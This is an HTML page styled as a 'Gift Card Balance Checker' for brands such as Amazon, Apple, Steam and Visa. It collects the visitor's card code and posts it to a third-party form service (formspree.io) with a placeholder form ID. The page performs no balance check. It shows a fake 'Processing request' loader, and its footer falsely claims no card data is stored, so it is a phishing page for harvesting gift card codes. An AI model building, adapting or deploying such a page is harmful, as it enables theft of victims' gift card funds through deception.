<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Check Gift Card Balance</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background: #ffffff;
  color: #222;
}

.wrapper {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.box {
  width: 100%;
  max-width: 420px;
  border: 1px solid #e5e5e5;
  border-radius: 6px;
  padding: 25px;
}

h1 {
  font-size: 20px;
  text-align: center;
  margin-bottom: 10px;
}

.subtitle {
  text-align: center;
  font-size: 13px;
  color: #666;
  margin-bottom: 25px;
}

label {
  font-size: 13px;
  margin-top: 15px;
  display: block;
}

select, input {
  width: 100%;
  padding: 11px;
  margin-top: 6px;
  border: 1px solid #ccc;
  border-radius: 4px;
  font-size: 14px;
}

button {
  width: 100%;
  margin-top: 20px;
  padding: 12px;
  background: #1a73e8;
  border: none;
  color: #fff;
  font-size: 15px;
  border-radius: 4px;
  cursor: pointer;
}

button:hover {
  background: #1558b0;
}

.loader {
  display: none;
  margin-top: 15px;
  text-align: center;
  font-size: 13px;
  color: #555;
}

footer {
  margin-top: 20px;
  font-size: 11px;
  color: #777;
  text-align: center;
  line-height: 1.5;
}
</style>

<script>
function showLoader() {
  document.getElementById("loader").style.display = "block";
}
</script>

</head>
<body>

<div class="wrapper">
  <div class="box">

    <h1>Gift Card Balance Checker</h1>
    <div class="subtitle">
      Secure & informational gift card balance verification
    </div>

    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="showLoader()">

      <label>Gift Card Type</label>
      <select name="card_type" required>
        <option value="">Select card</option>
        <option>Amazon</option>
        <option>Apple</option>
        <option>Google Play</option>
        <option>Steam</option>
        <option>Xbox</option>
        <option>PlayStation</option>
        <option>Sephora</option>
        <option>Visa / Mastercard</option>
        <option>Other</option>
      </select>

      <label>Card Code</label>
      <input type="text" name="card_code" placeholder="Enter card code" required>

      <button type="submit">Check Balance</button>

      <div id="loader" class="loader">
        Processing requestâ€¦
      </div>

    </form>

    <footer>
      This service does not store card data.<br>
      Always confirm balances on official issuer websites.
    </footer>

  </div>
</div>

</body>
</html>
